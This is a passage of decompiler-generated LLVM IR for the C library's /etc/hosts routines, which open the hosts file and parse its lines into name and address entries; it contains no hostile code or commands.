  uselistorder label %dec_label_pc_8053edc, { 3, 1, 2, 0 }
}

define i32 @__open_etc_hosts() local_unnamed_addr {
entry:
  %v3_8053ef9 = call i32 @__GI_fopen(i32 ptrtoint ([11 x i8]* @global_var_80580c5.295 to i32), i32 ptrtoint (i32* @global_var_8058090.283 to i32))
  store i32 %v3_8053ef9, i32* @eax, align 4
  %v1_8053f01 = icmp eq i32 %v3_8053ef9, 0
  %v1_8053f03 = icmp eq i1 %v1_8053f01, false
  br i1 %v1_8053f03, label %dec_label_pc_8053f19, label %dec_label_pc_8053f05

dec_label_pc_8053f05:                             ; preds = %entry
  %v3_8053f11 = call i32 @__GI_fopen(i32 ptrtoint ([18 x i8]* @global_var_80580d0.296 to i32), i32 ptrtoint (i32* @global_var_8058090.283 to i32))
  br label %dec_label_pc_8053f19

dec_label_pc_8053f19:                             ; preds = %entry, %dec_label_pc_8053f05
  %v0_8053f1c = phi i32 [ %v3_8053ef9, %entry ], [ %v3_8053f11, %dec_label_pc_8053f05 ]
  ret i32 %v0_8053f1c

; uselistorder directives
  uselistorder i32 (i32, i32)* @__GI_fopen, { 3, 2, 1, 0, 6, 5, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_8058090.283 to i32), { 0, 1, 2, 4, 3, 5 }
  uselistorder label %dec_label_pc_8053f19, { 1, 0 }
}

define i32 @__read_etc_hosts_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32* %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp59 = ptrtoint i32* %arg5 to i32
  %stack_var_-44 = alloca i8*, align 4
  %v0_8053f1d = load i32, i32* @ebp, align 4
  %v0_8053f1e = load i32, i32* @edi, align 4
  %v0_8053f1f = load i32, i32* @esi, align 4
  %v0_8053f20 = load i32, i32* @ebx, align 4
  store i32 %arg6, i32* @ebx, align 4
  store i32 %arg7, i32* %edx.global-to-local, align 4
  %v1_8053f2e = sub i32 0, %arg6
  %v1_8053f30 = urem i32 %v1_8053f2e, 4
  %v2_8053f30 = icmp eq i32 %v1_8053f30, 0
  store i32 %v1_8053f30, i32* %eax.global-to-local, align 4
  br i1 %v2_8053f30, label %dec_label_pc_8053f41, label %dec_label_pc_8053f35

dec_label_pc_8053f35:                             ; preds = %entry
  %v2_8053f35 = sub i32 %arg7, %v1_8053f30
  %v7_8053f35 = icmp ugt i32 %v1_8053f30, %arg7
  br i1 %v7_8053f35, label %dec_label_pc_80541e5, label %dec_label_pc_8053f3d

dec_label_pc_8053f3d:                             ; preds = %dec_label_pc_8053f35
  %v2_8053f3d = add i32 %v1_8053f30, %arg6
  store i32 %v2_8053f3d, i32* @ebx, align 4
  store i32 %v2_8053f35, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8053f41

dec_label_pc_8053f41:                             ; preds = %entry, %dec_label_pc_8053f3d
  %v0_8053f4a = phi i32 [ %arg6, %entry ], [ %v2_8053f3d, %dec_label_pc_8053f3d ]
  %v0_8053f4d = phi i32 [ %arg7, %entry ], [ %v2_8053f35, %dec_label_pc_8053f3d ]
  %tmp149 = icmp ult i32 %v0_8053f4d, 32
  br i1 %tmp149, label %dec_label_pc_80541e5, label %dec_label_pc_8053f4a

dec_label_pc_8053f4a:                             ; preds = %dec_label_pc_8053f41
  %v1_8053f4a = add i32 %v0_8053f4a, 32
  store i32 %v1_8053f4a, i32* %eax.global-to-local, align 4
  %v1_8053f4d = add i32 %v0_8053f4d, -32
  store i32 %v1_8053f4d, i32* @ebp, align 4
  %v5_8053f50 = inttoptr i32 %v1_8053f4a to i8*
  %v12_8053f54 = icmp eq i32 %arg4, 1
  br i1 %v12_8053f54, label %dec_label_pc_8054076, label %dec_label_pc_8053f5f

dec_label_pc_8053f5f:                             ; preds = %dec_label_pc_8053f4a
  store i32 %arg9, i32* %eax.global-to-local, align 4
  %v1_8053f66 = inttoptr i32 %arg9 to i32*
  store i32 -1, i32* %v1_8053f66, align 4
  %tmp150 = icmp ult i32 %v1_8053f4d, 4
  br i1 %tmp150, label %dec_label_pc_80541e5, label %dec_label_pc_8053f72

dec_label_pc_8053f72:                             ; preds = %dec_label_pc_8053f5f
  %v0_8053f72 = load i32, i32* %edx.global-to-local, align 4
  %v1_8053f72 = add i32 %v0_8053f72, -36
  store i32 %v1_8053f72, i32* %eax.global-to-local, align 4
  %tmp151 = icmp ult i32 %v1_8053f72, 8
  br i1 %tmp151, label %dec_label_pc_80541e5, label %dec_label_pc_8053f7e

dec_label_pc_8053f7e:                             ; preds = %dec_label_pc_8053f72
  %v0_8053f7e = load i32, i32* @ebp, align 4
  %tmp152 = icmp ult i32 %v0_8053f7e, 16
  br i1 %tmp152, label %dec_label_pc_80541e5, label %dec_label_pc_8053f87

dec_label_pc_8053f87:                             ; preds = %dec_label_pc_8053f7e
  %v1_8053f87 = add i32 %v0_8053f72, -48
  store i32 %v1_8053f87, i32* %eax.global-to-local, align 4
  %tmp153 = icmp ult i32 %v1_8053f87, 8
  br i1 %tmp153, label %dec_label_pc_80541e5, label %dec_label_pc_8053f93

dec_label_pc_8053f93:                             ; preds = %dec_label_pc_8053f87
  %v0_8053f93 = load i32, i32* @ebx, align 4
  %v1_8053f93 = add i32 %v0_8053f93, 48
  %v1_8053f96 = add i32 %v0_8053f72, -44
  store i32 %v1_8053f96, i32* @ebp, align 4
  %v1_8053f9d = add i32 %v0_8053f72, -56
  store i32 %v1_8053f9d, i32* @eax, align 4
  %v1_8053fa0 = add i32 %v0_8053f93, 36
  store i32 %v1_8053fa0, i32* @edi, align 4
  %v7_8053fa3 = icmp ult i32 %v1_8053f9d, %v1_8053f96
  br i1 %v7_8053fa3, label %dec_label_pc_8053fac, label %dec_label_pc_8053fa7

dec_label_pc_8053fa7:                             ; preds = %dec_label_pc_8053f93
  %v1_8053fa7 = add i32 %v0_8053f93, 44
  store i32 %v1_8053fa7, i32* @esi, align 4
  br label %dec_label_pc_8053fb1

dec_label_pc_8053fac:                             ; preds = %dec_label_pc_8053f93
  %v1_8053fac = add i32 %v0_8053f93, 56
  store i32 %v1_8053fac, i32* @esi, align 4
  store i32 %v1_8053f9d, i32* @ebp, align 4
  br label %dec_label_pc_8053fb1

dec_label_pc_8053fb1:                             ; preds = %dec_label_pc_8053fa7, %dec_label_pc_8053fac
  %v0_8053fb1 = phi i32 [ %v1_8053f96, %dec_label_pc_8053fa7 ], [ %v1_8053f9d, %dec_label_pc_8053fac ]
  %tmp154 = icmp ult i32 %v0_8053fb1, 80
  br i1 %tmp154, label %dec_label_pc_80541e5, label %dec_label_pc_8053fba

dec_label_pc_8053fba:                             ; preds = %dec_label_pc_8053fb1
  %v0_8053fba = call i32 @__open_etc_hosts()
  store i32 %v0_8053fba, i32* %eax.global-to-local, align 4
  %v1_8053fc3 = icmp eq i32 %v0_8053fba, 0
  br i1 %v1_8053fc3, label %dec_label_pc_8053fe7, label %dec_label_pc_8053fc7

dec_label_pc_8053fc7:                             ; preds = %dec_label_pc_8053fba
  store i32 %v1_8053f4a, i32* %edx.global-to-local, align 4
  store i32 %v1_8053f93, i32* %eax.global-to-local, align 4
  store i8* %v5_8053f50, i8** %stack_var_-44, align 4
  %v0_8053fd2 = load i32, i32* @edi, align 4
  %v0_8053fde = load i32, i32* @esi, align 4
  %v5_8053fde = inttoptr i32 %v0_8053fde to i8*
  br label %dec_label_pc_8054095

dec_label_pc_8053fe7:                             ; preds = %dec_label_pc_8053fba
  store i32 %arg8, i32* %edx.global-to-local, align 4
  %v1_8053feb = inttoptr i32 %arg8 to i32*
  store i32 0, i32* %v1_8053feb, align 4
  %v1_8053ff1 = call i32 @__errno_location(i32 0)
  store i32 %v1_8053ff1, i32* %eax.global-to-local, align 4
  %v1_8053ff6 = inttoptr i32 %v1_8053ff1 to i32*
  %v2_8053ff6 = load i32, i32* %v1_8053ff6, align 4
  store i32 %v2_8053ff6, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80541e5

dec_label_pc_8054001:                             ; preds = %dec_label_pc_8054168
  store i32 %stack_var_-40.0, i32* %eax.global-to-local, align 4
  %v2_8054005 = load i8*, i8** %stack_var_-44, align 4
  %v3_8054005 = ptrtoint i8* %v2_8054005 to i32
  %v2_8054008 = inttoptr i32 %stack_var_-40.0 to i32*
  store i32 %v3_8054005, i32* %v2_8054008, align 4
  %v0_805400a = load i32, i32* %eax.global-to-local, align 4
  %v1_805400a = add i32 %v0_805400a, 4
  %v2_805400a = inttoptr i32 %v1_805400a to i32*
  store i32 0, i32* %v2_805400a, align 4
  store i32 %tmp59, i32* %edx.global-to-local, align 4
  %v0_8054015 = load i32, i32* @ebx, align 4
  %v1_8054015 = add i32 %v0_8054015, 4
  %v2_8054015 = inttoptr i32 %v1_8054015 to i32*
  %v3_8054015 = load i32, i32* %v2_8054015, align 4
  store i32 %v3_8054015, i32* %eax.global-to-local, align 4
  store i32 %v3_8054015, i32* %arg5, align 4
  %v0_805401a = load i32, i32* %edx.global-to-local, align 4
  %v1_805401a = add i32 %v0_805401a, 8
  %v2_805401a = inttoptr i32 %v1_805401a to i32*
  store i32 2, i32* %v2_805401a, align 4
  %v0_8054021 = load i32, i32* %edx.global-to-local, align 4
  %v1_8054021 = add i32 %v0_8054021, 12
  %v2_8054021 = inttoptr i32 %v1_8054021 to i32*
  store i32 4, i32* %v2_8054021, align 4
  br label %dec_label_pc_805405a

dec_label_pc_805402e:                             ; preds = %dec_label_pc_805418a
  store i32 %stack_var_-32.0, i32* %edx.global-to-local, align 4
  store i32 %stack_var_-36.0, i32* %eax.global-to-local, align 4
  %v2_8054036 = inttoptr i32 %stack_var_-32.0 to i32*
  store i32 %stack_var_-36.0, i32* %v2_8054036, align 4
  %v0_8054038 = load i32, i32* %edx.global-to-local, align 4
  %v1_8054038 = add i32 %v0_8054038, 4
  %v2_8054038 = inttoptr i32 %v1_8054038 to i32*
  store i32 0, i32* %v2_8054038, align 4
  store i32 %tmp59, i32* %edx.global-to-local, align 4
  %v0_8054043 = load i32, i32* @ebx, align 4
  %v1_8054043 = add i32 %v0_8054043, 4
  %v2_8054043 = inttoptr i32 %v1_8054043 to i32*
  %v3_8054043 = load i32, i32* %v2_8054043, align 4
  store i32 %v3_8054043, i32* %eax.global-to-local, align 4
  store i32 %v3_8054043, i32* %arg5, align 4
  %v0_8054048 = load i32, i32* %edx.global-to-local, align 4
  %v1_8054048 = add i32 %v0_8054048, 8
  %v2_8054048 = inttoptr i32 %v1_8054048 to i32*
  store i32 10, i32* %v2_8054048, align 4
  %v0_805404f = load i32, i32* %edx.global-to-local, align 4
  %v1_805404f = add i32 %v0_805404f, 12
  %v2_805404f = inttoptr i32 %v1_805404f to i32*
  store i32 16, i32* %v2_805404f, align 4
  br label %dec_label_pc_805405a

dec_label_pc_805405a:                             ; preds = %dec_label_pc_8054001, %dec_label_pc_805402e
  %storemerge = phi i32 [ %stack_var_-40.0, %dec_label_pc_8054001 ], [ %stack_var_-32.0, %dec_label_pc_805402e ]
  %v1_805405a = load i32, i32* %edx.global-to-local, align 4
  %v2_805405a = add i32 %v1_805405a, 16
  %v3_805405a = inttoptr i32 %v2_805405a to i32*
  store i32 %storemerge, i32* %v3_805405a, align 4
  %v0_805405d = load i32, i32* @ebx, align 4
  %v1_805405d = add i32 %v0_805405d, 8
  %v1_8054060 = load i32, i32* %edx.global-to-local, align 4
  %v2_8054060 = add i32 %v1_8054060, 4
  %v3_8054060 = inttoptr i32 %v2_8054060 to i32*
  store i32 %v1_805405d, i32* %v3_8054060, align 4
  store i32 %arg8, i32* @eax, align 4
  %v0_8054067 = load i32, i32* %edx.global-to-local, align 4
  %v2_8054067 = inttoptr i32 %arg8 to i32*
  store i32 %v0_8054067, i32* %v2_8054067, align 4
  br label %dec_label_pc_80541c5

dec_label_pc_8054076:                             ; preds = %dec_label_pc_8053f4a
  store i8* null, i8** %stack_var_-44, align 4
  %.pre = inttoptr i32 %arg9 to i32*
  br label %dec_label_pc_8054095

dec_label_pc_8054095:                             ; preds = %dec_label_pc_8053fc7, %dec_label_pc_8054076
  %v1_8054099.pre-phi = phi i32* [ %v1_8053f66, %dec_label_pc_8053fc7 ], [ %.pre, %dec_label_pc_8054076 ]
  %stack_var_-32.0 = phi i32 [ %v1_8053f93, %dec_label_pc_8053fc7 ], [ 0, %dec_label_pc_8054076 ]
  %stack_var_-36.0 = phi i32 [ %v1_8053f4a, %dec_label_pc_8053fc7 ], [ 0, %dec_label_pc_8054076 ]
  %stack_var_-40.0 = phi i32 [ %v0_8053fd2, %dec_label_pc_8053fc7 ], [ 0, %dec_label_pc_8054076 ]
  %stack_var_4.0 = phi i32 [ %v0_8053fba, %dec_label_pc_8053fc7 ], [ %arg1, %dec_label_pc_8054076 ]
  %stack_var_-20.0 = phi i8* [ %v5_8053fde, %dec_label_pc_8053fc7 ], [ %v5_8053f50, %dec_label_pc_8054076 ]
  store i32 %arg9, i32* @edx, align 4
  store i32 1, i32* %v1_8054099.pre-phi, align 4
  %v4_80541b1 = ptrtoint i8* %stack_var_-20.0 to i32
  %v2_805414e = inttoptr i32 %arg2 to i8*
  %v0_80541ab120127 = load i32, i32* @edx, align 4
  %v3_80541b5121128 = call i32 @fgets(i32 %v4_80541b1, i32 %stack_var_4.0, i32 %v0_80541ab120127)
  store i32 %v3_80541b5121128, i32* @eax, align 4
  %v1_80541bd122129 = icmp eq i32 %v3_80541b5121128, 0
  %v1_80541bf123130 = icmp eq i1 %v1_80541bd122129, false
  br i1 %v1_80541bf123130, label %dec_label_pc_80540ac.lr.ph.lr.ph, label %dec_label_pc_80541c5

dec_label_pc_80540ac.lr.ph.lr.ph:                 ; preds = %dec_label_pc_8054095
  %v12_8054183 = icmp eq i32 %arg3, 10
  %v12_8054161 = icmp eq i32 %arg3, 2
  %v12_8054128 = icmp eq i32 %arg4, 2
  %v1_805412d = icmp eq i1 %v12_8054128, false
  %v1_8054166 = icmp eq i1 %v12_8054161, false
  %v1_8054188 = icmp eq i1 %v12_8054183, false
  br label %dec_label_pc_80540ac.lr.ph

dec_label_pc_80540ac.lr.ph:                       ; preds = %dec_label_pc_80540ac.lr.ph.lr.ph, %dec_label_pc_80541ab.outer.backedge
  %stack_var_-28.0.ph131 = phi i32 [ 1, %dec_label_pc_80540ac.lr.ph.lr.ph ], [ 2, %dec_label_pc_80541ab.outer.backedge ]
  br label %dec_label_pc_80540ac

dec_label_pc_80540ac:                             ; preds = %dec_label_pc_80540ac.lr.ph, %dec_label_pc_80541ab.backedge
  %v3_80540b4 = call i32 @__GI_strchr(i8* %stack_var_-20.0, i32 35)
  store i32 %v3_80540b4, i32* @eax, align 4
  %v1_80540bc = icmp eq i32 %v3_80540b4, 0
  br i1 %v1_80540bc, label %dec_label_pc_80540c3, label %dec_label_pc_80540c0

dec_label_pc_80540c0:                             ; preds = %dec_label_pc_80540ac
  %v1_80540c0 = inttoptr i32 %v3_80540b4 to i8*
  store i8 0, i8* %v1_80540c0, align 1
  br label %dec_label_pc_80540c3

dec_label_pc_80540c3:                             ; preds = %dec_label_pc_80540ac, %dec_label_pc_80540c0
  store i32 %v4_80541b1, i32* @ecx, align 4
  store i32 0, i32* @edi, align 4
  %v2_805410332 = load i8, i8* %stack_var_-20.0, align 1
  %v3_805410333 = icmp eq i8 %v2_805410332, 0
  %v1_805410639 = icmp eq i1 %v3_805410333, false
  br i1 %v1_805410639, label %dec_label_pc_80540cf.preheader.preheader, label %dec_label_pc_8054108

dec_label_pc_80540cf.preheader.preheader:         ; preds = %dec_label_pc_80540c3
  %v4_80540cf97.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_80540cf.preheader

dec_label_pc_80540cb:                             ; preds = %dec_label_pc_80540d5
  store i8 0, i8* %v1_80540cf102, align 1
  %v0_80540ce = load i32, i32* @ecx, align 4
  %v1_80540ce = add i32 %v0_80540ce, 1
  store i32 %v1_80540ce, i32* @ecx, align 4
  %v1_80540cf = inttoptr i32 %v1_80540ce to i8*
  %v2_80540cf = load i8, i8* %v1_80540cf, align 1
  %v3_80540cf = zext i8 %v2_80540cf to i32
  %v4_80540cf = load i32, i32* %eax.global-to-local, align 4
  %v5_80540cf = and i32 %v4_80540cf, -256
  %v6_80540cf = or i32 %v5_80540cf, %v3_80540cf
  store i32 %v6_80540cf, i32* @eax, align 4
  %v4_80540d1 = icmp eq i8 %v2_80540cf, 0
  br i1 %v4_80540d1, label %dec_label_pc_80540cf.dec_label_pc_8054108.loopexit_crit_edge, label %dec_label_pc_80540d5

dec_label_pc_80540d5:                             ; preds = %dec_label_pc_80540cf.preheader, %dec_label_pc_80540cb
  %v2_80540cf103 = phi i8 [ %v2_80540cf, %dec_label_pc_80540cb ], [ %v2_80540cf95, %dec_label_pc_80540cf.preheader ]
  %v1_80540cf102 = phi i8* [ %v1_80540cf, %dec_label_pc_80540cb ], [ %v1_80540cf94, %dec_label_pc_80540cf.preheader ]
  %v0_80540cb101 = phi i32 [ %v1_80540ce, %dec_label_pc_80540cb ], [ %v0_80540cf47, %dec_label_pc_80540cf.preheader ]
  %v2_80540d5 = sext i8 %v2_80540cf103 to i32
  store i32 %v2_80540d5, i32* @edx, align 4
  %v0_80540d8 = load i32, i32* @global_var_8059eb8, align 8
  store i32 %v0_80540d8, i32* %eax.global-to-local, align 4
  %v2_80540dd = mul nsw i32 %v2_80540d5, 2
  %v3_80540dd = add i32 %v0_80540d8, %v2_80540dd
  %v4_80540dd = inttoptr i32 %v3_80540dd to i8*
  %v5_80540dd = load i8, i8* %v4_80540dd, align 1
  %v6_80540dd = and i8 %v5_80540dd, 32
  %v7_80540dd = icmp eq i8 %v6_80540dd, 0
  %v1_80540e1 = icmp eq i1 %v7_80540dd, false
  br i1 %v1_80540e1, label %dec_label_pc_80540cb, label %dec_label_pc_80540e3

dec_label_pc_80540e3:                             ; preds = %dec_label_pc_80540d5
  %v0_80540e3 = load i32, i32* @edi, align 4
  %v1_80540e3 = add i32 %v0_80540e3, -6
  %v6_80540e3 = sub i32 5, %v0_80540e3
  %v7_80540e3 = and i32 %v6_80540e3, %v0_80540e3
  %v8_80540e3 = icmp slt i32 %v7_80540e3, 0
  %v9_80540e3 = icmp eq i32 %v1_80540e3, 0
  %v10_80540e3 = icmp slt i32 %v1_80540e3, 0
  %v3_80540e6 = icmp eq i1 %v10_80540e3, %v8_80540e3
  %v4_80540e6 = icmp eq i1 %v9_80540e3, false
  %v5_80540e6 = and i1 %v4_80540e6, %v3_80540e6
  br i1 %v5_80540e6, label %dec_label_pc_80540ef.preheader, label %dec_label_pc_80540e8

dec_label_pc_80540e8:                             ; preds = %dec_label_pc_80540e3
  %v1_80540e8 = load i32, i32* @ebx, align 4
  %v3_80540e8 = mul i32 %v0_80540e3, 4
  %v4_80540e8 = add i32 %v1_80540e8, %v3_80540e8
  %v5_80540e8 = inttoptr i32 %v4_80540e8 to i32*
  store i32 %v0_80540cb101, i32* %v5_80540e8, align 4
  %v0_80540eb = load i32, i32* @edi, align 4
  %v1_80540eb = add i32 %v0_80540eb, 1
  store i32 %v1_80540eb, i32* @edi, align 4
  %v0_80540ef.pre.pre = load i32, i32* @ecx, align 4
  %v4_80540ef.pre.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80540ef.preheader

dec_label_pc_80540ef.preheader:                   ; preds = %dec_label_pc_80540e8, %dec_label_pc_80540e3
  %v4_80540ef.pre = phi i32 [ %v4_80540ef.pre.pre, %dec_label_pc_80540e8 ], [ %v0_80540d8, %dec_label_pc_80540e3 ]
  %v0_80540ef.pre = phi i32 [ %v0_80540ef.pre.pre, %dec_label_pc_80540e8 ], [ %v0_80540cb101, %dec_label_pc_80540e3 ]
  %v1_805410852 = phi i32 [ %v1_80540eb, %dec_label_pc_80540e8 ], [ %v0_80540e3, %dec_label_pc_80540e3 ]
  %v1_80540ef104 = inttoptr i32 %v0_80540ef.pre to i8*
  %v2_80540ef105 = load i8, i8* %v1_80540ef104, align 1
  %v3_80540ef106 = zext i8 %v2_80540ef105 to i32
  %v5_80540ef107 = and i32 %v4_80540ef.pre, -256
  %v6_80540ef108 = or i32 %v3_80540ef106, %v5_80540ef107
  store i32 %v6_80540ef108, i32* @eax, align 4
  %v4_80540f1109 = icmp eq i8 %v2_80540ef105, 0
  br i1 %v4_80540f1109, label %dec_label_pc_8054103.loopexit, label %dec_label_pc_80540f5.lr.ph

dec_label_pc_80540f5.lr.ph:                       ; preds = %dec_label_pc_80540ef.preheader
  %v0_80540f8.pre = load i32, i32* @global_var_8059eb8, align 8
  br label %dec_label_pc_80540f5

dec_label_pc_80540ee:                             ; preds = %dec_label_pc_80540f5
  %v1_80540ee = add i32 %v0_8054103110, 1
  store i32 %v1_80540ee, i32* @ecx, align 4
  %v1_80540ef = inttoptr i32 %v1_80540ee to i8*
  %v2_80540ef = load i8, i8* %v1_80540ef, align 1
  %v3_80540ef = zext i8 %v2_80540ef to i32
  %v5_80540ef = and i32 %v0_80540f8.pre, -256
  %v6_80540ef = or i32 %v3_80540ef, %v5_80540ef
  store i32 %v6_80540ef, i32* @eax, align 4
  %v4_80540f1 = icmp eq i8 %v2_80540ef, 0
  br i1 %v4_80540f1, label %dec_label_pc_8054103.loopexit, label %dec_label_pc_80540f5

dec_label_pc_80540f5:                             ; preds = %dec_label_pc_80540f5.lr.ph, %dec_label_pc_80540ee
  %v2_80540ef112 = phi i8 [ %v2_80540ef105, %dec_label_pc_80540f5.lr.ph ], [ %v2_80540ef, %dec_label_pc_80540ee ]
  %v1_80540ef111 = phi i8* [ %v1_80540ef104, %dec_label_pc_80540f5.lr.ph ], [ %v1_80540ef, %dec_label_pc_80540ee ]
  %v0_8054103110 = phi i32 [ %v0_80540ef.pre, %dec_label_pc_80540f5.lr.ph ], [ %v1_80540ee, %dec_label_pc_80540ee ]
  %v2_80540f5 = sext i8 %v2_80540ef112 to i32
  store i32 %v2_80540f5, i32* @edx, align 4
  store i32 %v0_80540f8.pre, i32* @eax, align 4
  %v2_80540fd = mul nsw i32 %v2_80540f5, 2
  %v3_80540fd = add i32 %v0_80540f8.pre, %v2_80540fd
  %v4_80540fd = inttoptr i32 %v3_80540fd to i8*
  %v5_80540fd = load i8, i8* %v4_80540fd, align 1
  %v6_80540fd = and i8 %v5_80540fd, 32
  %v7_80540fd = icmp eq i8 %v6_80540fd, 0
  br i1 %v7_80540fd, label %dec_label_pc_80540ee, label %dec_label_pc_8054103.loopexit

dec_label_pc_8054103.loopexit:                    ; preds = %dec_label_pc_80540f5, %dec_label_pc_80540ee, %dec_label_pc_80540ef.preheader
  %v4_80540cf97144 = phi i32 [ %v6_80540ef108, %dec_label_pc_80540ef.preheader ], [ %v6_80540ef, %dec_label_pc_80540ee ], [ %v0_80540f8.pre, %dec_label_pc_80540f5 ]
  %v0_8054103.lcssa = phi i32 [ %v0_80540ef.pre, %dec_label_pc_80540ef.preheader ], [ %v1_80540ee, %dec_label_pc_80540ee ], [ %v0_8054103110, %dec_label_pc_80540f5 ]
  %v1_80540ef.lcssa = phi i8* [ %v1_80540ef104, %dec_label_pc_80540ef.preheader ], [ %v1_80540ef, %dec_label_pc_80540ee ], [ %v1_80540ef111, %dec_label_pc_80540f5 ]
  %v2_8054103 = load i8, i8* %v1_80540ef.lcssa, align 1
  %v3_8054103 = icmp eq i8 %v2_8054103, 0
  %v1_8054106 = icmp eq i1 %v3_8054103, false
  br i1 %v1_8054106, label %dec_label_pc_80540cf.preheader, label %dec_label_pc_8054108

dec_label_pc_80540cf.preheader:                   ; preds = %dec_label_pc_80540cf.preheader.preheader, %dec_label_pc_8054103.loopexit
  %v1_8054108.pre147 = phi i32 [ %v1_805410852, %dec_label_pc_8054103.loopexit ], [ 0, %dec_label_pc_80540cf.preheader.preheader ]
  %v4_80540cf97 = phi i32 [ %v4_80540cf97144, %dec_label_pc_8054103.loopexit ], [ %v4_80540cf97.pre, %dec_label_pc_80540cf.preheader.preheader ]
  %v0_80540cf47 = phi i32 [ %v0_8054103.lcssa, %dec_label_pc_8054103.loopexit ], [ %v4_80541b1, %dec_label_pc_80540cf.preheader.preheader ]
  %v1_80540cf94 = inttoptr i32 %v0_80540cf47 to i8*
  %v2_80540cf95 = load i8, i8* %v1_80540cf94, align 1
  %v3_80540cf96 = zext i8 %v2_80540cf95 to i32
  %v5_80540cf98 = and i32 %v4_80540cf97, -256
  %v6_80540cf99 = or i32 %v5_80540cf98, %v3_80540cf96
  store i32 %v6_80540cf99, i32* @eax, align 4
  %v4_80540d1100 = icmp eq i8 %v2_80540cf95, 0
  br i1 %v4_80540d1100, label %dec_label_pc_8054108, label %dec_label_pc_80540d5

dec_label_pc_80540cf.dec_label_pc_8054108.loopexit_crit_edge: ; preds = %dec_label_pc_80540cb
  %v1_8054108.pre.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8054108

dec_label_pc_8054108:                             ; preds = %dec_label_pc_8054103.loopexit, %dec_label_pc_80540cf.dec_label_pc_8054108.loopexit_crit_edge, %dec_label_pc_80540cf.preheader, %dec_label_pc_80540c3
  %v1_8054108 = phi i32 [ 0, %dec_label_pc_80540c3 ], [ %v1_8054108.pre.pre, %dec_label_pc_80540cf.dec_label_pc_8054108.loopexit_crit_edge ], [ %v1_8054108.pre147, %dec_label_pc_80540cf.preheader ], [ %v1_805410852, %dec_label_pc_8054103.loopexit ]
  %v0_8054108 = load i32, i32* @ebx, align 4
  %v2_8054108 = mul i32 %v1_8054108, 4
  %v3_8054108 = add i32 %v2_8054108, %v0_8054108
  %v4_8054108 = inttoptr i32 %v3_8054108 to i32*
  store i32 0, i32* %v4_8054108, align 4
  %v0_805410f = load i32, i32* @edi, align 4
  %v7_8054112 = icmp sgt i32 %v0_805410f, 1
  br i1 %v7_8054112, label %dec_label_pc_8054118, label %dec_label_pc_80541ab.backedge

dec_label_pc_8054118:                             ; preds = %dec_label_pc_8054108
  br i1 %v12_8053f54, label %dec_label_pc_80541e5, label %dec_label_pc_8054123

dec_label_pc_8054123:                             ; preds = %dec_label_pc_8054118
  store i32 1, i32* @esi, align 4
  br i1 %v1_805412d, label %dec_label_pc_8054145.lr.ph, label %dec_label_pc_805412f

dec_label_pc_8054145.lr.ph:                       ; preds = %dec_label_pc_8054123
  br label %dec_label_pc_8054145

dec_label_pc_805412f:                             ; preds = %dec_label_pc_8054123
  %v0_805412f = load i32, i32* @eax, align 4
  %v0_8054131 = load i32, i32* @ebx, align 4
  %v1_8054131 = inttoptr i32 %v0_8054131 to i32*
  %v2_8054131 = load i32, i32* %v1_8054131, align 4
  %v5_8054137 = call i32 @__GI_strcoll(i8* %v2_805414e, i32 %v2_8054131, i32 %v0_805412f, i32 %v0_805412f)
  store i32 %v5_8054137, i32* %eax.global-to-local, align 4
  %v1_805413f = icmp eq i32 %v5_8054137, 0
  %v1_8054141 = icmp eq i1 %v1_805413f, false
  br i1 %v1_8054141, label %dec_label_pc_80541ab.backedge, label %dec_label_pc_8054161

dec_label_pc_80541ab.backedge:                    ; preds = %dec_label_pc_805415a, %dec_label_pc_805412f, %dec_label_pc_8054108
  %v0_80541ab = load i32, i32* @edx, align 4
  %v3_80541b5 = call i32 @fgets(i32 %v4_80541b1, i32 %stack_var_4.0, i32 %v0_80541ab)
  store i32 %v3_80541b5, i32* @eax, align 4
  %v1_80541bd = icmp eq i32 %v3_80541b5, 0
  %v1_80541bf = icmp eq i1 %v1_80541bd, false
  br i1 %v1_80541bf, label %dec_label_pc_80540ac, label %dec_label_pc_80541c5

dec_label_pc_8054145:                             ; preds = %dec_label_pc_8054145.lr.ph, %dec_label_pc_805415a
  %v1_8054147119 = phi i32 [ 1, %dec_label_pc_8054145.lr.ph ], [ %v1_805415a, %dec_label_pc_805415a ]
  %v0_8054147 = load i32, i32* @ebx, align 4
  %v2_8054147 = mul i32 %v1_8054147119, 4
  %v3_8054147 = add i32 %v0_8054147, %v2_8054147
  %v4_8054147 = inttoptr i32 %v3_8054147 to i32*
  %v5_8054147 = load i32, i32* %v4_8054147, align 4
  %v3_805414e = call i32 @__GI_strcasecmp(i8* %v2_805414e, i32 %v5_8054147)
  store i32 %v3_805414e, i32* %eax.global-to-local, align 4
  %v1_8054156 = icmp eq i32 %v3_805414e, 0
  br i1 %v1_8054156, label %dec_label_pc_8054161, label %dec_label_pc_805415a

dec_label_pc_805415a:                             ; preds = %dec_label_pc_8054145
  %v0_805415a = load i32, i32* @esi, align 4
  %v1_805415a = add i32 %v0_805415a, 1
  store i32 %v1_805415a, i32* @esi, align 4
  %v1_805415b.pre = load i32, i32* @edi, align 4
  %v5_805415d = icmp slt i32 %v1_805415a, %v1_805415b.pre
  br i1 %v5_805415d, label %dec_label_pc_8054145, label %dec_label_pc_80541ab.backedge

dec_label_pc_8054161:                             ; preds = %dec_label_pc_805412f, %dec_label_pc_8054145
  br i1 %v1_8054166, label %dec_label_pc_8054183, label %dec_label_pc_8054168

dec_label_pc_8054168:                             ; preds = %dec_label_pc_8054161
  %v0_8054168 = load i32, i32* @esi, align 4
  %v3_8054169 = load i8*, i8** %stack_var_-44, align 4
  %v4_8054169 = ptrtoint i8* %v3_8054169 to i32
  %v0_805416d = load i32, i32* @ebx, align 4
  %v1_805416d = inttoptr i32 %v0_805416d to i32*
  %v2_805416d = load i32, i32* %v1_805416d, align 4
  %v4_8054171 = inttoptr i32 %v2_805416d to i8*
  %v5_8054171 = call i32 @inet_pton(i32 2, i8* %v4_8054171, i32 %v4_8054169, i32 %v0_8054168)
  store i32 %v5_8054171, i32* %eax.global-to-local, align 4
  %tmp84 = icmp slt i32 %v5_8054171, 1
  %tmp85 = icmp eq i1 %tmp84, false
